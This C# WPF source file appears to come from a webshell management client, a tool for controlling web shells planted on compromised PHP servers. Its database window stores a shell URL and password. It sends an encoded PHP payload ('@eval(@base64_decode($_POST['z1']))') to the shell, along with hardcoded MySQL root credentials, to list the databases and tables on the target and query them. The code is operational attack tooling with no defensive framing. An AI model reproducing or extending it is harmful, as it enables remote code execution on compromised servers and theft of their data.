using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using WpfApp1.Payload.php;
using WpfApp1.Utli;

namespace WpfApp1.UI
{
    /// <summary>
    /// db.xaml 的交互逻辑
    /// </summary>
    public partial class db : Window
    {
        /// <summary>
        /// 引入mysql payload
        /// </summary>
        MysqlDB mysqlDB = new MysqlDB();

        /// <summary>
        /// base64 加密
        /// </summary>
        encrypt encrypt = new encrypt();

        /// <summary>
        /// 连接shell 地址
        /// </summary>
        public string getUrl { get; set; }
        /// <summary>
        /// shell密码
        /// </summary>
        public string getPwd { get; set; }
        /// <summary>
        /// 脚本类型
        /// </summary>
        public string getScipt { get; set; }
     
        public db()
        {
            InitializeComponent();
           
        }

        /// <summary>
        /// 返回的数据
        /// </summary>
        /// <param name="value"></param>
        public void Recevie(string value)
        {
            DataBaseList.Items.Clear();
            if (value == "返回数据为空")
            {
                textMessage.Text = value;
            }
            else
            {
                string[] xz = value.Split("\r\n");
                foreach (var x in xz)
                {

                    DataBaseList.Items.Add(x);
                }
            }
            

        }
        /// <summary>
        /// 新建连接 按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            DbAdd dbAdd = new DbAdd();
            dbAdd.shell = getUrl;
            dbAdd.Passwords = getPwd;
            dbAdd.sendMessage = Recevie;
            dbAdd.Show();
            
        }
        /// <summary>
        /// DataBaseList 点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DataBaseList_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            TablesListView.Items.Clear();
            object a;
            a = DataBaseList.SelectedItem;

            string Tables = ShowTables(a.ToString());
            string[] xz = Tables.Split("\r\n");
            foreach (var x in xz)
            {

                TablesListView.Items.Add(x);
            }
           
        }

        /// <summary>
        /// 执行sql语句 获取数据库表名
        /// </summary>
        /// <returns></returns>
        public string ShowTables(string databse)
        {
            string z1 = "%40eval(%40base64_decode(%24_POST%5B'z1'%5D))%3B";
            string db = encrypt.EncodeBase64("utf-8",databse);
            string s = String.Format("&host=MTI3LjAuMC4x&user=cm9vdA==&pwd=cm9vdA==&dbn={0}",db);
            string p = z1 + "&z1=" + mysqlDB.show_tables() + s;

            string rsults = Post.Postring(getUrl, new Dictionary<string, string> { { getPwd, p }, });

            return rsults;
        }

        private void TablesListView_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            object a;
            a = TablesListView.SelectedItem;
            TextEditor.Text = String.Format("SELECT * FROM `{0}` ORDER BY 1 DESC LIMIT 0,20;",a.ToString());
        }
    }
}
